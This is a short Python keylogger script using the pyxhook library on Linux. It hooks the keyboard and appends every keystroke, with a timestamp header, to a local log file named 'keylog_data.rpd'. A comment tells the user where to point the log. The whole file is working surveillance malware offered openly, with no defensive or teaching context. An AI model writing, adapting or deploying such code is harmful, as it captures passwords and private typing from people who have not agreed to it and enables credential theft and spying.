import pyxhook
from datetime import datetime
add = ""
log_file='keylog_data.rpd' ## put here your the directory where you want to save the keylogged data 
fob=open(log_file,'a')
fob.write("\n")
fob.write(datetime.now().strftime("\n\n%b-%d-%Y \n%H:%M:%S\n\n"))
fob.write("\n")
fob.close()
bad = ["Delete","Tab","Caps_Lock","bar","Shift_L","Control_L","Shift_R","space","exclam","at","numbersign","dollar","percent","asciicircum","ampersand","asterisk","Super_L","Alt_L","Alt_R","Control_R","Left","Up","Down","Right","P_Enter","P_Add","P_Subtract","P_Multiply","P_Divide","Num_Lock","BackSpace","Insert","Print","Escape","equal","plus","minus","underscore","P_End","P_Down","P_Next","P_Left","P_Begin","P_Right","P_Home","P_Up","P_Page_Up","P_Insert","P_Delete","parenleft","parenright","quotedbl","apostrophe","comma","less","greater","comma","period","question","slash","colon","semicolon","braceleft","braceright","bracketleft","bracketright"]
bnum = len(bad)
def OnKeyPress(event):
  fob=open(log_file,'a')
  add = event.Key
  for i in range(bnum):
    if(add == bad[i]):
      add = " "+add+" "
  fob.write(add)
  print(add)
  fob.close()
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
